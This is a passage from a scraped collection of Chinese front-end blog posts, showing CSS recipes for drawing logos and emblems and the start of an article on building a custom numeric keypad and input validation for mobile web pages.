rotate(-36deg);\n}\n</code></pre>\n<ul>\n<li>太极八卦</li>\n</ul>\n<p></p><figure><img alt=\"太极八卦\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c62e88dda173?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"273\" data-height=\"262\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;273&quot; height=&quot;262&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>利用 box-shadow 实现 ， 代码很简单：</p>\n<pre><code>/*TaiChi*/\n.TaiChi{\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    width: 200px;\n    height: 200px;\n    transform: translate(-50%, -50%);\n    box-shadow:0 0 2px #ddd;\n    border-radius:50%;\n    background-image:\n            radial-gradient(#000 12.5px, transparent 12.5px),\n            radial-gradient(#fff 12.5px, transparent 12.5px),\n            radial-gradient(#fff 50px, transparent 50px),\n            radial-gradient(#000 50px, transparent 50px),\n            linear-gradient(90deg,#000 100px, #fff 100px);\n    background-position:center 50px,center -50px,center 50px,center -50px,0 0;\n}\n</code></pre>\n<ul>\n<li>美队盾牌</li>\n</ul>\n<p></p><figure><img alt=\"美队盾牌\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c654fe2e1e5b?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"267\" data-height=\"279\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;267&quot; height=&quot;279&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>利用 渐变 实现 ， 代码如下：</p>\n<pre><code>/*captainAmerica*/\n.captainAmerica{\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    width: 200px;\n    height: 200px;\n    transform: translate(-50%, -50%);\n    background:\n            linear-gradient(45deg, rgba(255,255,255,0) 35%, rgba(255,255,255,0.4) 50%, rgba(255,255,255,0) 65%),\n            linear-gradient(-45deg, rgba(255,255,255,0) 35%, rgba(255,255,255,0.4) 50%, rgba(255,255,255,0) 65%),\n            linear-gradient(to right, rgba(0,0,0,0) 35%, rgba(0,0,0,0.2) 50%, rgba(0,0,0,0) 65%),\n            linear-gradient(to bottom, rgba(0,0,0,0) 35%, rgba(0,0,0,0.2) 50%, rgba(0,0,0,0) 65%),\n            radial-gradient(ellipse at center, #0033b0 20%, #ce0021 20%, #ce0021 35%, #eee 35%, #eee 55%, #ce0021 55%);\n    border-radius: 50%;\n    box-shadow: 0 3px 0 #a20917,0 4px 2px 2px #eee;\n}\n.captainAmerica::before{\n    content: '★';\n    position:absolute;\n    top: 50%;left: 50%;\n    transform: translate(-50%, -50%);\n    margin-left:-3px;\n    width: 50px;height:50px;\n    font-family: simsun,Tahoma,Helvetica,Arial,SimHei,sans-serif;\n    line-height: 47px;\n    z-index: 1;\n    border-radius: 50%;\n    font-size: 55px;\n    color: #fff;\n    text-align:center;\n    text-shadow: 2px 1px 2px #777;\n}\n</code></pre>\n<ul>\n<li>纽扣</li>\n</ul>\n<p></p><figure><img alt=\"纽扣\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c66d6b7f7ca4?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"253\" data-height=\"237\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;253&quot; height=&quot;237&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>利用 渐变、阴影 实现 ， 实现方法如下：</p>\n<pre><code>/*button*/\n.button{\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    transform: translate(-50%, -50%);\n    width: 180px;\n    height: 180px;\n    background: #87ceeb;\n    border-radius: 50%;\n    box-shadow:\n            inset 0 5px 5px #87ceeb,\n            inset 0 17px 5px rgba(255,255,255,0.7),\n            inset 0 -3px 3px rgba(255,255,255,0.3),\n            inset 0 -10px 10px rgba(0,0,0,0.3),\n            inset 0 -15px 10px #45b3e0,\n            0 7px 10px rgba(0,0,0,0.3);\n}\n.button::before{\n    content: '';\n    position:absolute;\n    top: 50%;left: 50%;\n    width: 110px;height: 106px;\n    margin-left: -55px;margin-top: -55px;\n    background-image:\n            radial-gradient(circle at 38px 38px, #333 10px, transparent 10px),\n            radial-gradient(circle at 73px 73px, #333 10px, transparent 10px),\n            radial-gradient(circle at 38px 73px, #333 10px, transparent 10px),\n            radial-gradient(circle at 73px 38px, #333 10px, transparent 10px);\n    border-radius: 50%;\n    border-top: 1px solid rgba(0,0,0,0.6);\n    border-bottom: 1px solid rgba(255,255,255,0.6);\n    box-shadow:\n            inset 0 20px 2px rgba(255,255,255,0.3),\n            3px -15px 7px -4px rgba(0,0,0,0.3),\n            0 -14px 10px 5px #45b3e0,\n            0 2px 5px 5px #87ceeb,\n            0 10px 5px 5px rgba(255,255,255,0.6);\n}\n.button::after{\n    content: '';\n    position:absolute;\n    top: 50%;left: 50%;\n    width: 50px;height: 50px;\n    margin-left: -25px;\n    margin-top: -23px;\n    background-image:\n            linear-gradient(to right, transparent 35%, #000080 35%, #4682b4 40%, #000080 45%, #4682b4 50%, #000080 55%, #4682b4 60%, #000080 65%, transparent 65%),\n            linear-gradient(to bottom, transparent 35%, #000080 35%, #4682b4 40%, #000080 45%, #4682b4 50%, #000080 55%, #4682b4 60%, #000080 65%, transparent 65%);\n    border-radius: 50%;\n    transform: rotate(45deg);\n}\n</code></pre>\n<ul>\n<li>Chrome</li>\n</ul>\n<p></p><figure><img alt=\"Chrome\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c68ed206684a?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"278\" data-height=\"263\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;278&quot; height=&quot;263&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>利用渐变实现 , 具体如下：</p>\n<pre><code>/*chrome*/\n.Chrome{\n    position: absolute;\n    top: 50%;left: 50%;\n    width: 180px;height: 180px;\n    transform: translate(-50%, -50%);\n    box-shadow:0 0px 4px #999,0 0 2px #ddd inset;\n    border-radius:50%;\n    background-image:\n            radial-gradient(#4FACF5 0%,#2196F3 28%, transparent 28%),\n            radial-gradient(#fff 33%, transparent 33%),\n            linear-gradient(-50deg,#FFEB3B 34%, transparent 34%),\n            linear-gradient(60deg,#4CAF50 33%, transparent 33%),\n            linear-gradient(180deg,#FF756B 0%, #F44336 30%, transparent 30%),\n            linear-gradient(-120deg,#FFEB3B 40%, transparent 40%),\n            linear-gradient(-60deg,#FFEB3B 30%, transparent 30%),\n            linear-gradient(0deg,#4CAF50 45%, transparent 45%),\n            linear-gradient(60deg,#4CAF50 30%, transparent 30%),\n            linear-gradient(120deg,#F44336 50%, transparent 50%),\n            linear-gradient(180deg,#F44336 30%, transparent 30%);\n    background-position:0 0;\n}\n</code></pre>\n<ul>\n<li>Opera</li>\n</ul>\n<p></p><figure><img alt=\"Opera\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c6ad7311175f?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"253\" data-height=\"255\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;253&quot; height=&quot;255&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>利用渐变实现 , 代码如下：</p>\n<pre><code>/*Opera*/\n.Opera{\n    position: absolute;\n    top: 50%;left: 50%;\n    width: 170px;height: 200px;\n    transform: translate(-50%, -50%);\n    border-radius:50%;\n    box-shadow:0 2px 4px #333;\n    background-image:\n            linear-gradient(rgb(254, 135, 138) 0%, rgb(231, 22, 22) 50%, rgb(128, 0, 0) 85%, rgb(184, 3, 4) 100%);\n}\n.Opera:after{\n    content:\"\";\n    position: absolute;\n    top:50%;left:50%;\n    width: 60px;height: 180px;\n    transform: translate(-50%, -50%);\n    border-radius:50%;\n    background:#fff;\n}\n.Opera:before{\n    content:\"\";\n    position: absolute;\n    top:50%;left:50%;\n    width: 72px;height: 185px;\n    transform: translate(-50%, -50%);\n    border-radius:50%;\n    background:rgba(0,0,0,.4);\n}\n</code></pre>\n<ul>\n<li>IE</li>\n</ul>\n<p></p><figure><img alt=\"IE\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c6c9d941f7cb?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"314\" data-height=\"267\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;314&quot; height=&quot;267&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>利用渐变、多重阴影实现 ， 代码实现如下：</p>\n<pre><code>/*IE*/\n.IE{\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    width:200px;\n    height:200px;\n    transform: translate(-50%, -50%);\n    border-radius:50%;\n    background-image:\n            radial-gradient(#fff 38%, transparent 38%),\n            radial-gradient(#09C 0%, #09C 100%);\n\n}\n.IE:before{\n    content: \"\";\n    width:285px;\n    height:122px;\n    background:none;\n    border-radius:100%;\n    position:absolute;\n    top:33px;\n    left:-45px;\n    margin:auto;\n    box-shadow:\n            inset 0 12px 0 13px  #09c,\n            -35px -8px 0 -5px #fff;\n    transform: rotate(-35deg);\n}\n.IE:after {\n    content: \"\";\n    width: 120px;\n    height: 25px;\n    background: #09c;\n    position: absolute;\n    top: 80px;\n    left: 0;\n    right: 0;\n    margin: auto;\n    box-shadow: 50px 23px 0 -2px #fff\n}\n</code></pre>\n<ul>\n<li>safari</li>\n</ul>\n<p></p><figure><img alt=\"safari\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c996a8c00cbd?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"302\" data-height=\"276\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;302&quot; height=&quot;276&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>利用渐变、border、旋转实现 ， 具体代码如下：</p>\n<pre><code>/*safari*/\n.safari{\n    position: absolute;\n    top: 50%;left: 50%;\n    width:200px; height:200px;\n    transform: translate(-50%, -50%);\n    border-radius:50%;\n    border:5px solid #E8E8E8;\n    box-shadow:\n            -1px 3px 1px 2px #999,\n            -1px 3px 1px 2px #999 inset;\n    background-image:\n            radial-gradient(transparent 30%,#fff 30%,#fff 34%, transparent 34%),\n            linear-gradient(rgba(255,255,255,.8) 100%, transparent 100%),\n            linear-gradient(rgba(255,255,255,.8) 100%, transparent 100%),\n            linear-gradient(rgba(255,255,255,.8) 100%, transparent 100%),\n            linear-gradient(rgba(255,255,255,.8) 100%, transparent 100%),\n            linear-gradient(#1DE3FF 0%, #1F52EF 100%);\n    background-size: 50% 50%,20px 2px,20px 2px,2px 20px,2px 20px,100%,100%;\n    background-repeat:no-repeat;\n    background-position:center center, 175px center,5px center,center 175px,center 5px,0 0;\n\n}\n.safari::before{\n    content:\"\";\n    position: absolute;\n    top: 10px;left: 50%;\n    border-radius:10px;\n    border-bottom:100px solid rgba(255,255,255,.9);\n    border-left:10px solid transparent;\n    border-right:10px solid transparent;\n    transform-origin:center 90px;\n    z-index:-1;\n    transform:translate(-50%, 0%) rotate(40deg);\n}\n.safari::after{\n    content:\"\";\n    position: absolute;\n    top: 10px;left: 50%;\n    border-radius:10px;\n    border-bottom:100px solid rgba(255,0,0,.9);\n    border-left:10px solid transparent;\n    border-right:10px solid transparent;\n    transform-origin:center 90px;\n    transform:translate(-50%, 0%) rotate(220deg);\n}\n.safari:hover::before{\n    transition:transform 1s;\n    transform:translate(-50%, 0%) rotate(70deg);\n}\n.safari:hover::after{\n    transition:transform 1s;\n    transform:translate(-50%, 0%) rotate(250deg);\n}\n</code></pre>\n<ul>\n<li>firefox</li>\n</ul>\n<p></p><figure><img alt=\"firefox\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c9c9d255ca6a?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"303\" data-height=\"262\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;303&quot; height=&quot;262&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>利用多重阴影实现 , 代码如下：</p>\n<pre><code>/*firefox*/\n.firefox{\n    position: absolute;\n    top: 50%;left: 50%;\n    width: 200px;height:200px;\n    transform: translate(-50%, -50%);\n    border:8px solid #eee;\n    border-radius:50%;\n    overflow:hidden;\n    background:#F48D00;\n    box-shadow:0 0 2px 0 #999;\n}\n.firefox::before{\n    content: \"\";\n    width: 46px;\n    height: 46px;\n    background: #A4DFEF;\n    border-radius: 100%;\n    position: absolute;\n    top: 90px;\n    left: 50px;\n    margin: auto;\n    border: 1px solid #A4DFEF;\n    box-shadow:\n            -10px 0 0 5px rgba(164, 223, 239, .2),\n            16px -60px 0 8px rgba(164, 223, 239, .2),\n            -30px -50px 0 8px #F48D00,\n            25px -38px 0 0px #A4DFEF,\n            -30px -30px 0 12px #F48D00,\n            15px -60px 0 8px #A4DFEF,\n            33px 31px 0 -15px #A4DFEF,\n            30px 17px 0 -13px #F48D00,\n            20px -10px 0 0px #A4DFEF,\n            -8px -0px 0 19px #F48D00,\n            30px 17px 0 0px #A4DFEF,\n            24px 30px 0 15px #F48D00,\n            20px -6px 0 28px #A4DFEF,\n            45px 10px 0 35px #F48D00,\n            -5px -57px 0 8px #F48D00,\n            20px -23px 0 45px #A4DFEF,\n            -5px -80px 0 8px #A4DFEF,\n            -30px -70px 0 8px #F48D00,\n            -5px -57px 0 8px #F48D00,\n            43px -11px 0 55px #F48D00,\n            22px -39px 0 55px #A4DFEF;\n}\n.firefox::after{\n    content: \"\";\n    width: 0px;\n    height: 2px;\n    background: linear-gradient(90deg,#F48D00 75% ,#333 30% );\n    background-size: 35px 35px;\n    position: absolute;\n    top: 50px;\n    left: 73px;\n    margin: auto;\n    border: solid;\n    border-width: 12px 0 15px 30px;\n    border-color: #A4DFEF #fff #A4DFEF transparent;\n    box-shadow: inset 0px 0 0 50px #333;\n}\n</code></pre>\n<ul>\n<li>搜狗</li>\n</ul>\n<p></p><figure><img alt=\"搜狗\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c9d800b66778?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"304\" data-height=\"267\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;304&quot; height=&quot;267&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>利用文字、阴影实现 , 具体代码如下：</p>\n<pre><code>/*sougou*/\n.sogou{\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    width: 200px;height:200px;\n    transform: translate(-50%, -50%);\n    border:8px solid #fff;\n    box-shadow: 2px 1px 2px 2px #ccc;\n    border-radius:50%;\n    overflow:hidden;\n    background:#4DA0ED;\n}\n.sogou::before{\n    content:\"S\";\n    position: absolute;\n    line-height: 185px;\n    top:0;\n    left:0;\n    right:0;\n    bottom:0;\n    color:#fff;\n    font-weight:600;\n    font-size:320px;\n    text-align:center;\n    text-shadow:\n            3px 0 0px #337FC4,\n            -5px 0px 0px #CDE4F0,\n            0px 8px 0px #387FBF;\n    transform:rotate(2deg);\n    z-index:-10;\n    overflow:hidden;\n}\n</code></pre>\n<ul>\n<li>利用滤镜实现混合效果</li>\n</ul>\n<p></p><figure><img alt=\"filter-mix\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609caaf1fcb43b8?imageslim\" data-width=\"433\" data-height=\"233\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;433&quot; height=&quot;233&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>利用 <code>fliter:blur()</code> 、<code>filter:contrast()</code> 实现 ， 代码如下：</p>\n<pre><code>/*filter-mix*/\n.filter-mix{\n    position: absolute;\n    top: 50%;left: 50%;\n    transform: translate(-50%, -50%);\n    width: 300px;height: 200px;\n    -webkit-filter:contrast(20);\n    background:#fff;\n}\n.filter-mix::before{\n    content:\"\";\n    position: absolute;\n    width:120px;\n    height:120px;\n    border-radius: 50%;\n    background:#333;\n    top:40px;\n    left:0px;\n    z-index:2;\n    -webkit-filter:blur(6px);\n    box-sizing:border-box;\n    animation:filterBallMove 10s ease-out infinite;\n    -webkit-animation:filterBallMove 10s ease-out infinite;\n}\n.filter-mix::after{\n    content:\"\";\n    position: absolute;\n    width:80px;\n    height:80px;\n    border-radius: 50%;\n    background:#3F51B5;\n    top:60px;\n    right:0px;\n    z-index:2;\n    -webkit-filter:blur(6px);\n    animation:filterBallMove2 10s ease-out infinite;\n    -webkit-animation:filterBallMove2 10s ease-out infinite;\n\n}\n\n@keyframes filterBallMove{\n    50%{\n        left:200px;\n    }\n}\n\n@-webkit-keyframes filterBallMove{\n    50%{\n        left:200px;\n    }\n}\n\n@keyframes filterBallMove2{\n    50%{\n        right:200px;\n    }\n}\n\n@-webkit-keyframes filterBallMove2{\n    50%{\n        right:200px;\n    }\n}\n</code></pre>\n<h3 class=\"heading\" data-id=\"heading-4\">装逼总结</h3>\n<p>怎么样，是不是颠覆了你对 <code>CSS3</code> 的认识？</p>\n<p>实际上 <code>CSS3</code> 带给我们的远不止这些东西，没有做不到，只有想不到，只有你脑洞够大，各种黑科技、酷炫的 <code>CSS</code> 必然也是手到擒来~</p>\n<p>虽然你给不了 <code>CSS3</code> 全部，但它却把全部给了你，骚年，加油吧~</p>\n<p></p><figure><img alt=\"end\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/29/160a05b024f6d86e?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"220\" data-height=\"220\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;220&quot; height=&quot;220&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<h3 class=\"heading\" data-id=\"heading-5\">参考文献</h3>\n<p>本文主要来源以下文章：</p>\n<p><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fchokcoco%2FmagicCss\" rel=\"nofollow noopener noreferrer\">magicCss</a></p>\n<p><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fcssmagic%2FCSS-Secrets\" rel=\"nofollow noopener noreferrer\">CSS Secrets</a></p>\n<p>对 <code>CSS</code> 感兴趣的同学可以去作者的 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fchokcoco\" rel=\"nofollow noopener noreferrer\">github</a> 点个赞~</p>\n</div>"},{"title":"一个数字键盘引发的血案——移动端H5输入框、光标、数字键盘全假套件实现","avatar":"https://user-gold-cdn.xitu.io/2017/12/28/1609c4e1868bd267?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"百度外卖大前端技术团队","create_time":"2017 年 12 月 28 日","tags":["JavaScript","Vue.js","前端","jQuery"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><p></p><figure><img class=\"lazyload inited loaded\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609cc26a47774c1?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"720\" data-height=\"1280\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609cc26a47774c1?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\"><figcaption></figcaption></figure><p></p>\n<p>为啥要写假键盘？</p>\n<p>还是输入框、光标全假的假键盘？</p>\n<p>手机自带的不用非得写个假的，吃饱没事干吧？</p>\n<p>装逼？炫技？</p>\n<p>宝宝也是被逼的，宝宝也很委屈~.~</p>\n<p></p><figure><img class=\"lazyload inited loaded\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609ca5f7a8f5767?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"230\" data-height=\"212\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609ca5f7a8f5767?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\"><figcaption></figcaption></figure><p></p>\n<h2 class=\"heading\" data-id=\"heading-0\">问题产生背景</h2>\n<p>移动端H5项目需求点：</p>\n<p>进入某页面自动弹出带小数点的数字键盘，并且自带输入验证，比如金额——只能输入数字和小数点，并且只能输入一位小数点、小数位不超过2位，且输入前验证不合法就不让输入、(UE特加功能——定制光标颜色&gt;.&lt;简直是反人类的需求)。细分如下：</p>\n<ul>\n<li>进入相关页面，输入框自动获取焦点</li>\n<li>键盘自动弹出</li>\n<li>弹出带小数点的数字键盘</li>\n<li>数字输入前自动验证，只能输入一个小数点，小数位数不超过2位，超过就不能继续输入</li>\n<li>如果光标在第一位，此时键入的是'.'，则自动放入'0'再插入'.'</li>\n</ul>\n<h2 class=\"heading\" data-id=\"heading-1\">实现方案拟定</h2>\n<h3 class=\"heading\" data-id=\"heading-2\">1. 基于input + 手机自带键盘实现方案</h3>\n<p>（1）针对功能点1，可以给 input 设置属性 autofocus , 输入框就能自动聚焦。 轻松搞定</p>\n<p>（2）针对功能点2 ，给input设置属性 autofocus 会自动聚焦但是键盘并不会自动弹出;</p>\n<p>必须手动点击输入框键盘才会弹出; 于是在进入页面的时候用js触发click或者foucus，发现键盘也不会自动弹出，延时click、focus也没能弹出;那么只有最后一种方案——就是让NA端提供让键盘弹出的方法。 <strong>纯前端无法搞定，需要NA端协助/，或者找PM砍掉自动弹键盘的需求&gt;.&lt;（勉强能够接受）</strong></p>\n<p>（3）针对功能点3，弹数字键盘的方法可以设置 type = \"number\" 或者type = \"tel\"; 前者在Andriod可以弹出数字键盘在ios端只能弹全键盘，后者在Android和ios弹出的都是数字键盘，但是！！坑爹的，弹出的数字键盘没有小数点！（我的华为荣耀9倒是很给力的给我弹了个带小数点的数字键盘，不容易啊啊） <strong>只能选择type = \"number\",勉强能接受ios弹全键盘吧</strong></p>\n<p>（4）针对功能点4， 设置type = \"number\"，发现可以不停的输入小数点啊啊啊啊看着真的要疯了，第一次输入小数点也不能自动变成'0.'</p>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609ca9e85a369e9?imageslim\" data-width=\"459\" data-height=\"195\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;459&quot; height=&quot;195&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure>\n图1 原生input type=number 效果<p></p>\n<p>这时候聪明的你一定想到要使用事件监听键入的字符，在输入之前进行判断，然后决定是否放入输入框。</p>\n<p>你肯定又会开心的想到一堆可能有用的事件：onkeydown，onkeyup，onchange，oninput，onpropertychange，textInput。</p>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609cc4217c080c6?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"204\" data-height=\"233\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;204&quot; height=&quot;233&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>路漫漫其修远兮啊~经过不断尝试之后仍然发现很多问题。</p>\n<ul>\n<li>onkeyup——虽然每增加删除字符都会触发，但增加字符的时候是值输入之后才触发，无法做到输入前验证;</li>\n<li>onchange——是在内容改变（两次内容有可能相等）且失去焦点时触发，也无法做到输入前验证。</li>\n<li>onpropertychange——onchange事件在内容改变（两次内容有可能还是相等的）且失去焦点时触发；即每增加或删除一个字符就会触发，通过js改变也会触发该事件，但是该事件IE专有。</li>\n<li>oninput——移动端很多手机不支持。</li>\n</ul>\n<p>（只剩下onkeyup/textInput，还有一线希望刚芭蕾&gt;.&lt;。）</p>\n<ul>\n<li>\n<p>onkeyup——其事件有两个相关属性event.key和event.keyCode。event.key在我的华为荣耀9手机上都不生效（其他低版本手机可想而知）。但其还有一个属性event.keyCode其在PC端的值是键入字符的ascii码。但在手机端输入任何数字或者小数点其值均为229（华为荣耀9测试），所以onkeyup也不能用。</p>\n</li>\n<li>\n<p>ontextInput——在pc和移动端都支持！！！（功夫不负有心人）其event.data可以获取到输入的值。欢天喜地，举国欢庆，啊哈哈~~</p>\n</li>\n</ul>\n<p>终于松了一口气，只要能在输入前获取值就能验证了呀。</p>\n<p>自信满满的一口气写完验证过程：</p>\n<p>html</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">&lt;input\n    id=<span class=\"hljs-string\">\"amount-input\"</span>\n    autofocus\n    <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">\"number\"</span>\n    @textInput=<span class=\"hljs-string\">\"checkNumber\"</span>\n    v-model=<span class=\"hljs-string\">\"amount\"</span>\n    require/&gt; \n</code></pre><p>js</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">checkNumber(event) {\n  var key = event.data || <span class=\"hljs-string\">''</span>;\n  <span class=\"hljs-keyword\">if</span> (key.search(/[0-9\\.]/) &gt; -1) {\n     var value = document.getElementById(<span class=\"hljs-string\">'amount-input'</span>).value;\n     <span class=\"hljs-keyword\">if</span> (key === <span class=\"hljs-string\">'.'</span> &amp;&amp; value.search(/\\./) &gt; -1) {\n        event.preventDefault();\n     }\n     <span class=\"hljs-keyword\">if</span> (value.search(/\\.\\d{2}/) &gt; -1) {\n       event.preventDefault();\n     }\n  } <span class=\"hljs-keyword\">else</span> {\n     event.preventDefault();\n  }\n},\n</code></pre><p>杯具再次发生了~~~~~我所期望的效果仍然没有达到。</p>\n<p>通过value获取输入框内所有字符失败</p>\n<p>发现<code>input type = number</code> 取到的value只能是数值，无法获取输入框里的所有字符。</p>\n<p>也就是说如果输入'12.'，通过value获取到是'12'，只输入'.'，value获取到的是' '空字符串，获取不到小数点。这样就无法判断是否输入小数点，因而不能判断是否还能输入小数点，那就还是能输入无数个小数点，问题依然得不到解决。</p>\n<p>尝试：</p>\n<ul>\n<li>使用VUE中双向绑定的this.amount来获取输入的所有字符，发现this.amount获取到的和value获取值的情况相同。尝试失败。</li>\n<li>通过textInput获取到的输入值，自己维护一个字符数组。但是textInput在删除时不会触发，因而不能实时获取input输入框里面的所有准确字符；而且由于无法获取光标在input输入框的具体位置而无法确定删除的是哪个字符，因而字符数组无法准确维护。尝试失败。</li>\n</ul>\n<p>（5）针对功能点5，功能4解决了，功能5是小case。。。</p>\n<p>所以基于input + 手机自带键盘实现方案要满足以上需求难以实现</p>\n<h3 class=\"heading\" data-id=\"heading-3\">2. 基于input + 假数字键盘实现方案</h3>\n<p>若是用假键盘加原生input输入框，需要做到：</p>\n<ul>\n<li>禁用手机自带键盘</li>\n<li>获取Input输入框中的内容</li>\n</ul>\n<p>禁用手机自带键盘，在没有NA暴露的方法支持的情况下，可以设置Input的readonly属性。这样的话输入框也不能添加删除字符了。若在可以要NA端提供禁用手机自带键盘的方法的前提下，要实现点击假键盘输入框能添加删除字符。</p>\n<p>若是只从后面添加删除，很容易实现，只需要将点击键盘对应的字符拼接到<code>Input type=text</code>获取到的value的后面，删除同理。但是要是光标不在最后一位，而是在中间</p>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609cc75e7d8709c?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"261\" data-height=\"51\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;261&quot; height=&quot;51&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<pre><code> 图2 光标在数字中间示例图\n</code></pre>\n<p>那么当我们点击假键盘添加或删除字符的时候，如何能知道添加或删除字符的位置呢。也许需要获取光标位置。目前只有IE和火狐支持的document.selection，selectionStart可以获取光标位置。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">// 获取光标位置\n<span class=\"hljs-keyword\">function</span> getCursortPosition (textDom) {\n var cursorPos = 0;\n <span 